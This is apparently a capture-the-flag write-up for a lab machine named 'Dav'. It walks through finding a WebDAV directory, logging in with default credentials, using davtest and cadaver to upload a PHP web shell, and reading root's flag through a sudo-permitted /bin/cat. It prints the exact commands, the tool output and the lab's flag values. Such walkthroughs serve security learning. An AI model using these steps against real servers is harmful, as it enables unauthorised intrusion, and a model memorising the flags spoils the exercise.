# Dav

Simple and easy. However, included a few new tools and things so worth writing down.

First up, a scan revealed a single port open: the port 80 website. Going there revealed the apache landing page.

A dirb revealed just one additional thing (aside from index and server-status): `/webdav`. Going to webdav pushed up a basic auth password prompt.

I did a bit of reading, finding this article which was useful: https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/. However, it all required credentials to work.

I checked the source of the home page, did more intensive scans and dirbs, but couldn't find anything. Since bruteforcing without a username is never the right move, that just left default credentials.

I tried a few sets I googled, and the second set worked: `wampp:xampp`

Next, davtest: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp`

This revealed: 

```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.119.10/webdav
********************************************************
NOTE    Random string for this session: t0ADTE
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.119.10/webdav/DavTestDir_t0ADTE
********************************************************
 Sending test files
PUT     cfm     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.cfm
PUT     txt     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.txt
PUT     html    SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.html
PUT     jhtml   SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.jhtml
PUT     asp     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.asp
PUT     pl      SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.pl
PUT     shtml   SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.shtml
PUT     php     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.php
PUT     cgi     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.cgi
PUT     aspx    SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.aspx
PUT     jsp     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.jsp
********************************************************
 Checking for test file execution
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.txt
EXEC    html    SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.html
EXEC    jhtml   FAIL
EXEC    asp     FAIL
EXEC    pl      FAIL
EXEC    shtml   FAIL
EXEC    php     SUCCEED:        http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.php
EXEC    cgi     FAIL
EXEC    aspx    FAIL
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.119.10/webdav/DavTestDir_t0ADTE
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.cfm
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.txt
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.html
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.jhtml
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.asp
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.pl
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.shtml
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.php
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.cgi
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.aspx
PUT File: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.jsp
Executes: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.txt
Executes: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.html
Executes: http://10.10.119.10/webdav/DavTestDir_t0ADTE/davtest_t0ADTE.php
```

So, I can upload files and I can upload PHP files, which are fully executable. I downloaded a copy of https://github.com/flozz/p0wny-shell/blob/master/shell.php and got to work.

Surprisingly, `davtest` despite having an `uploadfile` arg and showing in the above test it could upload, wasn't working. I tried this: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc http://10.10.119.10/webdav/shell.php` and it failed. After I rooted the machine later (while writing this) I did more investigation: the latter path is relative to the dir so this would have worked: `davtest -url http://10.10.119.10/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc shell.php`. Obvious really.

Instead, I used `cadaver http://10.10.119.10/webdav` which provides an FTP like experience. I used that to upload the shell via `put shell.php`. Navigated to `http://10.10.119.10/webdav/shell.php` and it loaded up nicely.

At this point, easy. The user.txt flag was in /home/merlin with value: `449b40fe93f78a938523b7e4dcd66d2a`. A `sudo -l` revealed the user could run `/bin/cat` with nopasswd as root, so `sudo /bin/cat /root/root.txt` got the root flag: `101101ddc16b0cdf65ba0b8a7af7afa5`. Easy peasy.